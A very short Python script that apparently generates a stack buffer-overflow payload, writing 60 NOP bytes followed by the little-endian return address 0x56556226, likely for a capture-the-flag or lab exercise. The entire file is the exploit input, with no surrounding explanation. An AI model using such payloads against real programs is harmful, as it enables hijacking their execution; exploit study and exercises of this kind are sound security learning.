#!/usr/bin/python3
import sys;

for i in range(1,61):
	sys.stdout.buffer.write(b"\x90")

# 0x56556226
sys.stdout.buffer.write(b"\x26\x62\x55\x56")
